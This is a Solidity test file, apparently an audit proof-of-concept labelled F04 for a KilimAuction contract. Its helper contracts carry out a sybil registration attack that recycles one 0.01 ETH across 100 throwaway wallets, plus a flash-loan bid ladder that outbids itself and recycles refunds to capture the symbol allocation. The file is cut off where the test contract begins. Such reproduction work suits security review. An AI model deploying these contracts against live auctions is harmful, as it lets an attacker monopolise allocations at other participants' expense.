// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import {TestBase} from "../TestBase.sol";
import {KilimAuction} from "../../src/KilimAuction.sol";
import {Kilim} from "../../src/Kilim.sol";

/// @dev Throwaway registrant: holds 0.01 ETH for the balance check, registers, hands the ETH back.
contract F04Sybil {
    constructor(KilimAuction auction) payable {
        auction.register();
        (bool ok,) = msg.sender.call{value: address(this).balance}("");
        require(ok);
    }
}

/// @dev Registers 100 throwaway wallets in one call with one recycled 0.01 ETH.
contract F04SybilFactory {
    function fill(KilimAuction auction) external payable {
        for (uint256 i; i < 100; ++i) {
            new F04Sybil{value: 0.01 ether}(auction);
        }
        (bool ok,) = msg.sender.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {}
}

/// @dev Minimal flash lender: lend, call back, require the principal back in the same call.
contract F04Lender {
    function flash(F04Ladder borrower, uint256 amount, uint256 maxBids) external {
        uint256 before = address(this).balance;
        borrower.onFlash{value: amount}(maxBids);
        require(address(this).balance >= before, "flash loan not repaid");
    }

    receive() external payable {}
}

/// @dev The attacker: outbids itself at the minimum step, recycling the automatic refund.
contract F04Ladder {
    KilimAuction public immutable auction;
    address public immutable owner;
    uint256 public bids;
    uint256 public refundsReceived;

    constructor(KilimAuction a) {
        auction = a;
        owner = msg.sender;
    }

    function ladder(uint256 maxBids) public {
        for (uint256 i; i < maxBids; ++i) {
            if (auction.symbolsAllocated() == auction.symbolCap()) break;
            uint256 m = auction.minimumBid();
            auction.bid{value: m}(m, 0, 0);
            ++bids;
        }
    }

    function onFlash(uint256 maxBids) external payable {
        ladder(maxBids);
        (bool ok,) = msg.sender.call{value: msg.value}("");
        require(ok, "cannot repay");
    }

    function claim(uint256 quantity, address to) external {
        require(msg.sender == owner);
        auction.claimSymbols(quantity, to);
    }

    function sweep() external {
        require(msg.sender == owner);
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {
        if (msg.sender == address(auction)) refundsReceived += msg.value;
    }
}

contract F04Test is TestBase {
    event log_named_uint(string key, uint256 val);

